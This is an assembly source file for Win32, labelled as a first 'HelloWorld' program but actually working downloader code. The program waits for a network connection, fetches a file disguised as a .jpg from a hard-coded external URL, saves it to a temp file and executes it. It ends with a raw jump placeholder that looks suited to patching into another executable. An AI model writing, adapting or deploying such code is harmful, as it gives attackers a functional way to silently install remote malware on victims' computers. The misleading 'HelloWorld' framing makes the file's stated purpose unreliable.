;------------------------
; 我的第一个基于WIN32的汇编程序
; 戚利
; 2006.2.28
;------------------------
    .386
    .model flat,stdcall
    option casemap:none

include    windows.inc
include    user32.inc
includelib user32.lib
include    kernel32.inc
includelib kernel32.lib
include    wininet.inc  
includelib wininet.lib  

    .code
jmp start

szText         db 'HelloWorld',0
lpCN           db 256 dup(0)
lpDWFlag       dd  ?
szTempPath     db '.',0
szAppName      db 'Shell',0
lpszURL        db 'http://www.sddx.gov.cn/pic/image10/cs/xxb/px/101214b-4.jpg',0
hInternet      dd ?
hInternetFile  dd ?
hThreadID      dd ?

;代码段
    .code

;-----------------------
; 线程函数，下载并运行
; 参数_lpURL指向要下载的文件
;-----------------------
_downAndRun proc _lpURL  
  local @szFileName[256]:byte
  local @dwBuffer,@dwNumberOfBytesWritten,@dwBytesToWrite
  local @lpBuffer[200h]:byte
  local @hFile
  local @stStartupInfo:STARTUPINFO  
  local @stProcessInformation:PROCESS_INFORMATION  

  invoke GetTempFileName,addr szTempPath,NULL,\
                             0,addr @szFileName
  invoke InternetOpen,offset szAppName,\
                  INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0 
  .if eax!=NULL
    mov hInternet,eax

    ;设置联接超时值和接收超时值
    invoke InternetSetOption,hInternet,\
             INTERNET_OPTION_CONNECT_TIMEOUT,addr @dwBuffer,4
    invoke InternetSetOption,hInternet,\
             INTERNET_OPTION_CONTROL_RECEIVE_TIMEOUT,\
                                      addr @dwBuffer,4
    ;用当前参数打开URL
    invoke InternetOpenUrl,hInternet,_lpURL,NULL,NULL,\
                           INTERNET_FLAG_EXISTING_CONNECT,0
    .if eax!=NULL
      mov hInternetFile,eax
      mov @dwNumberOfBytesWritten,200h
      ;读HTTP文件头
      invoke HttpQueryInfo,hInternetFile,HTTP_QUERY_STATUS_CODE,\
                 addr @lpBuffer,addr @dwNumberOfBytesWritten,0

      .if eax!=NULL
         ;打开临时文件准备写
         invoke CreateFile,addr @szFileName,GENERIC_WRITE,\
                                         0,NULL,OPEN_ALWAYS,0,0
         .if eax != 0FFFFFFFFh
           mov @hFile,eax
           .while TRUE
             mov @dwBytesToWrite,0
             ;读网络文件数据
             invoke InternetReadFile,hInternetFile,addr @lpBuffer,\
                       200h,addr @dwBytesToWrite
             .break .if (!eax)
             .break .if (@dwBytesToWrite==0)
             ;写入文件
             invoke WriteFile,@hFile,addr @lpBuffer,
                   @dwBytesToWrite,addr @dwNumberOfBytesWritten,0
           .endw
           invoke SetEndOfFile,@hFile
           invoke CloseHandle,@hFile
         .endif
      .endif
      invoke InternetCloseHandle,hInternetFile
    .endif
    invoke InternetCloseHandle,hInternet
  .endif
 
  ;运行下载的文件
  invoke GetStartupInfo,addr @stStartupInfo
  invoke CreateProcess,NULL,addr @szFileName,NULL,NULL,FALSE,\
            NORMAL_PRIORITY_CLASS,NULL,NULL,\
            addr @stStartupInfo,\
            addr @stProcessInformation  
  .if eax==0
    invoke CloseHandle,@stProcessInformation.hThread
    invoke CloseHandle,@stProcessInformation.hProcess               
  .endif  
  ret  
_downAndRun endp       


start:
    ;测试网络是否连通
    .while TRUE
      invoke Sleep,1000;睡眠1秒
      invoke InternetGetConnectedStateEx,\
                                 addr lpDWFlag,\
                                 addr lpCN,256,0
      .break .if eax
    .endw
    invoke _downAndRun,addr lpszURL
    db 0E9h,0ffh,0ffh,0ffh,0ffh
    end start
